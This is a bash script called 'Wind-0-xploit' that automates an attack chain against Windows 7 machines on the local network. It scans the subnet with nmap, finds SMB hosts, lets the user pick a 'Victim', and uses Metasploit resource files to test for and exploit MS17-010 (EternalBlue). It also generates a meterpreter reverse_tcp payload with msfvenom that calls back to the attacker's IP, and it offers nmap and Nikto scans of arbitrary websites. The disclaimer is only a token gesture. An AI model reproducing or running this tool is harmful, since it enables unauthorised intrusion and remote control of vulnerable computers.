#!/bin/bash
clear
NONE='\033[00m'
RED='\033[01;31m'
GREEN='\033[01;32m'
YELLOW='\033[01;33m'
PURPLE='\033[01;35m'
CYAN='\033[01;36m'
WHITE='\033[01;37m'
BOLD='\033[1m'
UNDERLINE='\033[4m'
italic="\x1b[3m italic"
underline="\x1b[4m underlined"
blink="\x1b[5m blinking"
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White
Close='\033[0m'
#Bold Text
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White




printf "
            \ \      / |_ _| \ | |  _ \       / _ \     \ \/ |  _ \| |   / _ |_ _|_   _|
             \ \ /\ / / | ||  \| | | | |_____| | | |_____\  /| |_) | |  | | | | |  | |  
              \ V  V /  | || |\  | |_| |_____| |_| |_____/  \|  __/| |__| |_| | |  | |  
               \_/\_/  |___|_| \_|____/       \___/     /_/\_|_|   |_____\___|___| |_|  

"

echo -e "  ${Green}	        ===========      ================      ===========      ============="
echo -e "  	           | Scan | ---> | Vulnerability | ---> | Payload | ---> | Exploit |"
echo -e "  	        ===========      ================      ===========     ==============${Close}"




echo -e "\x1b[1m    \x1b[3m         \033[01;31m              \x1b[5m                 \x1b[4mDISCLAIMER \033[00m   \033[01;33m \x1b[3m


Any actions and or activities related to the material contained within this project are designed for 
productive purpose only and this project contains materials that can be potentially damaging or dangerous"
                                                                                                                                                                                                                                                 





echo "	                                  USE IT WISELY "  
echo ""
sleep 1                              
active="$(ifconfig | grep "mtu 1500" | awk '{print $1}')"
ip="$(ifconfig | grep "inet" | grep -v "inet6" | grep -v "127.0.0.1" | awk '{print $2}')"
export ip
gateway="$(route -n | grep "UG" | awk '{print $2}')"
mac="$(ifconfig | grep "ether" | grep -v "inet6" | grep -v "127.0.0.1" | awk '{print $2}')"
echo -e "\033[01;36m  \033[1m===================================================================================================
				     YOUR SYSTEM INFORMATION							
  ===================================================================================================="
echo "                          Your IP address                 : $ip"
echo "                          Gateway's IP                    : $gateway"
echo "                          Your MAC address                : $mac"
echo "                          The current active interface(s) : $active "
echo ""
while :
do
echo ""
echo ""
echo -e "$BWhite Enter what you want to scan $Close"
echo -e "$BCyan 1.)Network"
echo -e "$BCyan 2.)Website"
echo -e "$BWhite Press e to exit"
echo "============================================================================================================================================"
sleep 1 
echo ""
echo -ne "${BBlue}Wind-0-xploit > ${Close}"
read choice
		case $choice in 
				1)
				#sleep 2
				echo -e "\033[01;33m \x1b[3mYou selected network scanning"
				#sleep 2
				echo "Enter your choice"
				echo "1.Scan network for devices"
				echo "2.Scan network for vulnerable devices"
echo "=============================================================================================================================================="
				echo -ne "${BBlue}Wind-0-xploit > ${Close}"
                                read n
				if [ $n == 1 ]
					then nmap $ip/24 -n -sP | grep report | awk '{print $5}' > output.txt
					#sleep 1
					more output.txt | awk '{print $1}'
					echo ""
					echo "Choose the target"
					read t
					echo "You selected $t"
					var=$(awk "NR==$t{print $1}" output.txt | awk '{print $1}' )
					#sleep 1
					echo ""
					echo "The selected target is $var"
					echo "press y to perform NMAP scanning on the target and n to exit [y/n] "
					read c
					if [ $c == y ]
						then 
						echo "Select the type of NMAP scanning you want to perform"
						echo "1. Full scan"
						echo "2. Half scan"
						read d
						if [ $d == 1 ]
							then nmap -sT $var -sV
						elif [ $d == 2 ]
							then nmap -sS $var -sV
						fi
					fi
				elif [ $n == 2 ]
					then
					
					echo "The supported operationg systems are"
					 
					echo "1. Windows 7"
echo "=============================================================================================================================================="
sleep 1
echo "Enter your choice"
read z
					case $z in
						1) 
						   
                                                   echo "Scanning network for devices with VULNERABLE windows 7 OS"
                                                   nmap $ip/24 -n -sP | grep report | awk '{print $5}' > output.txt
                                                   nmap -O -n -p445 --script smb-os-discovery -iL output.txt | grep -E 'report|OS: Windows 7' | grep -B1 "Windows 7" | grep "report" | awk '{print $5}' > os.txt 
                                                  
                                                   
						   #echo ""
						   #echo ""
echo "==============================================================================================================================================" 	
						   i=1
                                                   cat os.txt | while read LINE

                                                   do 
                                                   echo "$i>$LINE"
                                                   i=$((i +1))

                                                   done
echo "=============================================================================================================================================="
                                                   echo "Select the Victim"
                                                   echo -ne "${BBlue}Wind-0-xploit > ${Close}"
                                                   read choice
                                                   vulDevice=$(awk NR==$choice os.txt)
                                                   echo ""
                                                   echo ""
                                                   echo -e "You have selected ${BRed}$vulDevice${Close}"
                                                   #echo $vulDevice
                                                   echo "================================================================================="
                                                   echo "                         Checking For SMB Vulnerability"
                                                   echo "================================================================================="
                                                   export vulDevice
                                                   chmod +x exploit.rc
                                                   rm msfoutput.txt 
                                                   
                                                   xterm -l -lf msfoutput.txt -e "msfconsole -r exploit.rc" 
                                                   cat msfoutput.txt | grep "Host is likely VULNERABLE to MS17-010!"
                                                   echo -e "Do you want to verify by {$BRed}EXPLOITING{$Close} it(y/n)?"
                                                   read choiceExp
                                                   if [ $choiceExp == y ]
                                                      then
                                                        architecture=$(cat msfoutput.txt | grep "Host is likely VULNERABLE to MS17-010!" | awk '{print $15}')
                                                        echo "================================================================================="
                                                        echo "                               Generating Payload                                "
                                                        echo "================================================================================="
                                                        msfvenom -a $architecture --platform windows -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4445  -f exe -o $PWD/windows.exe
                                                        export acrhitecture
                                                        chmod +x exploit1.rc
                                                        msfconsole -r exploit1.rc
                                                   
                                                   fi
    
                                                   

					;;
					esac
				fi;;
			
				2)
				echo -e "\033[01;36m \x1b[3mYou selected to scan a website"
				sleep 2
				echo "Enter the wesite you want to scan"
echo "================================================================================================================================================"
				read w
				sleep 2
				echo "Select the type of NMAP scanning you want to perform"
				echo "1. Full scan"
				echo "2. Half scan"
				read d
				if [ $d == 1 ]
					then nmap -sT $w -sV 
				elif [ $d == 2 ]
					then nmap -sS $w -sV
				fi
				echo "do you also want to perform Nikto scan on the website [y]es/[n]o"
				read nikto
				if [ $nikto == y ]
					then 
					wip="$(nslookup $w | grep "Address" | grep -v "192.168.1.1" | awk '{print $2}')" 
					nikto -h $wip
				fi
					
				;;
				
			 exploit)
				;;
			 e)
				
				echo -e "\033[4m\033[1mYou selected to exit "
				
				echo "Hope that we will meet again soon!!"
				exit;;
		esac
done




